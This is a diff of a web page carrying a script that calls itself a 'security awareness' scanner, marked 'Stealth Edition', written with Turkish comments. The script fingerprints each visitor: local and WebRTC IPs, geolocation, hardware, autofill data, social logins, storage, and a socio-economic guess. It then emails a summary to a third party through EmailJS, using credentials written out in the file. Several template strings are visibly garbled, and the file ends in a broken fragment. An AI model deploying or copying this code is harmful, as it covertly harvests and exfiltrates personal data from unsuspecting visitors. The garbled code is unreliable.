@@ -639,8 +639,7 @@ button {
   <div id="status-message" class="fixed bottom-10 right-6 px-6 py-4 rounded-xl text-white font-bold shadow-2xl z-[110] opacity-0 translate-y-10 transition-all duration-500 pointer-events-none flex items-center gap-3 border border-white/10 backdrop-blur-md"></div> 
   <script src="script.js"></script> 
  
-<script type="text/javascript" id="dcoder_script">
-/* ==========================================================================
+<script type="text/javascript" id="dcoder_script">/* ==========================================================================
    DOSYA ADI: higer_security_scanner_full.js
    PROJE: HIGER SECURITY SCANNER - SECURITY AWARENESS PROJECT (Full Integrated Edition)
    SÜRÜM: 13.5 (Mail-Only Stealth Edition)
@@ -694,7 +693,7 @@ document.addEventListener('DOMContentLoaded', () => {
         EMAILJS: {
             SERVICE_ID: "service_5uyhust",
             TEMPLATE_ID: "template_5p9annp",
-            PUBLIC_KEY: atob("RjVjR0dXTUVIQlVK VFlXZV8=") // Masked with Base64
+            PUBLIC_KEY: "F5cGWMEHBUJTYWe_" // Maskeleme kaldırıldı, direkt raw string
         },
         ANIMATION_SPEED: {
             FAST: 200,
@@ -1399,7 +1398,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     cores: navigator.hardwareConcurrency || "Unknown",
                     ram: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Unknown",
                     platform: navigator.platform,
-                    screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
+                    screen: `\( {window.screen.width}x \){window.screen.height} (${window.screen.colorDepth}-bit)`,
                     gpu: gpu,
                     userAgent: navigator.userAgent
                 };
@@ -1546,7 +1545,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
                     max_texture_size: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                     max_render_buffer: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
-                    float_precision: highp ? `${highp.precision}/${highp.rangeMin}/${highp.rangeMax}` : "N/A",
+                    float_precision: highp ? `\( {highp.precision}/ \){highp.rangeMin}/${highp.rangeMax}` : "N/A",
                     shader_uniforms: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS)
                 };
             } catch (e) { 
@@ -1702,10 +1701,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 const likelyDevToolsOpen = (widthDiff > 160) || (heightDiff > 160);
                 
                 return {
-                    dims_outer: `${window.outerWidth}x${window.outerHeight}`,
-                    dims_inner: `${window.innerWidth}x${window.innerHeight}`,
+                    dims_outer: `\( {window.outerWidth}x \){window.outerHeight}`,
+                    dims_inner: `\( {window.innerWidth}x \){window.innerHeight}`,
                     devtools_open: likelyDevToolsOpen ? "POSSIBLE" : "No",
-                    screen_avail: `${window.screen.availWidth}x${window.screen.availHeight}`
+                    screen_avail: `\( {window.screen.availWidth}x \){window.screen.availHeight}`
                 };
             } catch (e) {
                 console.error("[Intelligence] getScreenConsistency Hatası:", e);
@@ -2576,13 +2575,37 @@ document.addEventListener('DOMContentLoaded', () => {
                     return;
                 }
 
-                // Payload'ı all_data_dump altında birleştir
-                const emailParams = {
-                    all_data_dump: Intelligence.safeJson(payload)
-                };
+                // Payload'ı all_data_dump altında birleştir (ama mailde göndermiyoruz, küçültülmüş)
+                const emailParams = {};
 
-                // Özet oluştur (v_summary)
-                emailParams.v_summary = `Sosyo-Ekonomik Tahmin: ${payload.sosyo_ekonomik || "N/A"}\nCihaz Sınıfı: ${payload.cihaz_sinifi || "N/A"}\nTahmini Lokasyon: ${payload.tahmini_lokasyon || "N/A"}\nİstihbarat Özeti: ${payload.istihbarat_ozeti || "N/A"}`;
+                // Özet oluştur (v_summary) - Sadece kritik veriler
+                emailParams.v_summary = `
+Visitor Name: ${payload.visitor_name || "N/A"}
+Timestamp: ${payload.timestamp || "N/A"}
+Zombie ID: ${payload.zombie_id || "N/A"}
+Fingerprint: ${payload.fingerprint || "N/A"}
+Is Bot: ${payload.is_bot || "N/A"}
+IP Local: ${payload.ip_local || "N/A"}
+IP WebRTC: ${payload.ip_webrtc || "N/A"}
+Geo Loc: ${payload.geo_loc || "N/A"}
+Timezone: ${payload.timezone || "N/A"}
+Net Speed: ${payload.net_speed || "N/A"}
+Net Type: ${payload.net_type || "N/A"}
+CPU Cores: ${payload.cpu_cores || "N/A"}
+RAM Memory: ${payload.ram_memory || "N/A"}
+GPU Model: ${payload.gpu_model || "N/A"}
+OS Platform: ${payload.os_platform || "N/A"}
+Screen Res: ${payload.screen_res || "N/A"}
+Battery: ${payload.battery || "N/A"}
+ISP Info: ISP: ${payload.isp_info.isp || "N/A"}, Country: ${payload.isp_info.country || "N/A"}
+Tahmini Lokasyon: ${payload.tahmini_lokasyon || "N/A"}
+Cihaz Sınıfı: ${payload.cihaz_sinifi || "N/A"}
+Sosyo-Ekonomik: ${payload.sosyo_ekonomik || "N/A"}
+İstihbarat Özeti: ${payload.istihbarat_ozeti || "N/A"}
+                `;
+
+                // all_data_dump'ı mailden tamamen çıkarıyoruz (boyut küçültmek için)
+                // Eğer veritabanı entegrasyonu varsa burada kalabilir, ama fetch'te yok.
 
                 // EmailJS Fetch ile gönder (Retry ile)
                 const sendWithRetry = async (retries = 1) => {
@@ -2597,7 +2620,11 @@ document.addEventListener('DOMContentLoaded', () => {
                                 template_params: emailParams
                             })
                         });
-                        if (!response.ok) throw new Error(response.statusText);
+                        if (!response.ok) {
+                            const errorText = await response.text();
+                            console.error("[Security] EmailJS Hata Detayı:", errorText);
+                            throw new Error(response.statusText);
+                        }
                         console.log("[Security] EmailJS Rapor gönderildi.");
                     } catch (e) {
                         console.error("[Security] EmailJS Hata:", e);
@@ -2881,90 +2908,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     const fullPayload = {
                         visitor_name: name,
                         timestamp: new Date().toLocaleString('tr-TR'),
-                        zombie_id: State.zombie_id || "N/A",
-                        fingerprint: State.fingerprint || canvasFP,
-                        is_bot: threatLevel.isBot ? "TEHLİKE (BOT)" : "TEMİZ (İNSAN)",
-                        bot_reason: autoFlags.detected_flags || "Yok",
-                        devtools: isDevToolsOpen,
-                        ip_local: localIP || "Gizli/VPN",
-                        ip_webrtc: webRTCIPs,
-                        geo_loc: geo,
-                        timezone: timeData.zone,
-                        net_speed: netData.downlink + " Mbps",
-                        net_type: netData.type,
-                        local_network_devices: localNetworkDevices,
-                        cpu_cores: specs.cores + " Çekirdek",
-                        ram_memory: specs.ram || "Bilinmiyor",
-                        gpu_model: gpuAdvanced.renderer || "Bilinmiyor",
-                        os_platform: specs.platform,
-                        screen_res: specs.screen,
-                        orientation: orientation,
-                        battery: battery || "N/A",
-                        hsts_supercookie: hstsSupercookie,
-                        mdns_devices: mdnsDevices,
-                        ssdp_devices: ssdpDevices,
-                        webgpu_support: webGpu,
-                        autofill_vuln: autofillVuln,
-                        clipboard: clipboardStatus,
-                        user_agent: specs.userAgent,
-                        cpu_class: cpuClass,
-                        refresh_rate: refreshRate,
-                        charging_cycle: chargingCycle,
-                        isp_info: Intelligence.safeJson(ispInfo),
-                        referrer: referrer,
-                        headers: Intelligence.safeJson(headers),
-                        autofill_data: Intelligence.safeJson(autofillData),
-                        is_vm: isVM,
-                        canvas_noise_bypass: canvasNoiseBypass,
-                        audio_noise_bypass: audioNoiseBypass,
-                        permissions: Intelligence.safeJson(permissions),
-                        advanced_audio_fp: Intelligence.safeJson(advancedAudioFP),
-                        storage_data: Intelligence.safeJson(storageData),
-                        media_data: Intelligence.safeJson(mediaData),
-                        social_logins: Intelligence.safeJson(socialLogins),
-                        perf_timings: Intelligence.safeJson(perfTimings),
-                        plugins_mime: Intelligence.safeJson(pluginsMime),
-                        touch_details: Intelligence.safeJson(touchDetails),
-                        memory_usage: Intelligence.safeJson(memoryUsage),
-                        cpu_bench: Intelligence.safeJson(cpuBench),
-                        math_prec: Intelligence.safeJson(mathPrec),
-                        date_formats: Intelligence.safeJson(dateFormats),
-                        number_formats: Intelligence.safeJson(numberFormats),
-                        media_queries: Intelligence.safeJson(mediaQueries),
-                        auto_flags: Intelligence.safeJson(autoFlags),
-                        screen_data: Intelligence.safeJson(screenData),
-                        gpu_advanced: Intelligence.safeJson(gpuAdvanced),
-                        font_data: Intelligence.safeJson(fontData),
-                        time_data: Intelligence.safeJson(timeData),
-                        net_data: Intelligence.safeJson(netData),
-                        navigator_props: Intelligence.safeJson(navigatorProps),
-                        window_dims: Intelligence.safeJson(windowDims),
-                        teknik_detay_ozeti: teknikDetayOzeti
-                    };
-
-                    // Analiz Ekle
-                    const analysis = Intelligence.analyzeIntelligence(fullPayload);
-                    fullPayload.istihbarat_ozeti = analysis.istihbarat_ozeti;
-                    fullPayload.tahmini_lokasyon = analysis.tahmini_lokasyon;
-                    fullPayload.cihaz_sinifi = analysis.cihaz_sinifi;
-                    fullPayload.sosyo_ekonomik = analysis.sosyo_ekonomik;
-
-                    await Security.generateReport(fullPayload);
-                })();
-
-            } catch (error) {
-                console.error("Accept Hatası:", error);
-                UI.elements.spinnerOverlay.classList.add('hidden');
-                UI.showStatus("status_fail", false);
-                AudioEngine.sfx.error();
-                setTimeout(() => UI.elements.modalBackdrop.classList.remove('hidden'), 2000);
-            }
-        }
-
-    };
-
-    Main.init();
-});</script></body></html>ing('tr-TR'),
                         zombie_id: State.zombie_id || "N/A",
                         fingerprint: State.fingerprint || canvasFP,
                         is_bot: threatLevel.isBot ? "TEHLİKE (BOT)" : "TEMİZ (İNSAN)",
